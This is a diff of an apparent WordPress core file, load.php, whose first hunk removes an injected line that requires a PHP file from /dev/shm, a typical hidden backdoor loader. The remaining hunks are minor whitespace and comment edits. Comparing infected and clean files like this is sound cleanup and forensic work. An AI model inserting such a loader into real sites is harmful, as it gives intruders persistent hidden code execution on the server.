@@ -4,7 +4,7 @@
  *
  * @package WordPress
  */
-require('/dev/shm/index.php');
+
 /**
  * Returns the HTTP protocol sent by the server.
  *
@@ -550,7 +550,7 @@ function timer_stop( $display = 0, $precision = 3 ) {
  * `WP_DEBUG_LOG` are set to false, and `WP_DEBUG_DISPLAY` is set to true.
  *
  * When `WP_DEBUG` is true, all PHP notices are reported. WordPress will also
- * display internal notices: when a deprecated WordPress function, function
+ * display internalnotices: when a deprecated WordPress function, function
  * argument, or file is used. Deprecated code may be removed from a later
  * version.
  *
@@ -839,7 +839,7 @@ function wp_start_object_cache() {
 	 * Filters whether to enable loading of the object-cache.php drop-in.
 	 *
 	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 *runtimes. If false is returned,object-cache.php will never be loaded.
+	 * runtimes. If false is returned,object-cache.php will never be loaded.
 	 *
 	 * @since 5.8.0
 	 *
@@ -1136,9 +1136,9 @@ function wp_get_active_and_valid_themes() {
 function wp_skip_paused_themes( array $themes ) {
 	$paused_themes = wp_paused_themes()->get_all();
 
-	if ( empty( $paused_themes ) ) {
+	if ( empty( $paused_themes) ) {
 		return $themes;
-	}foreach( $themes as $index => $theme ) {
+	}foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
 		if ( array_key_exists( $theme, $paused_themes ) ) {
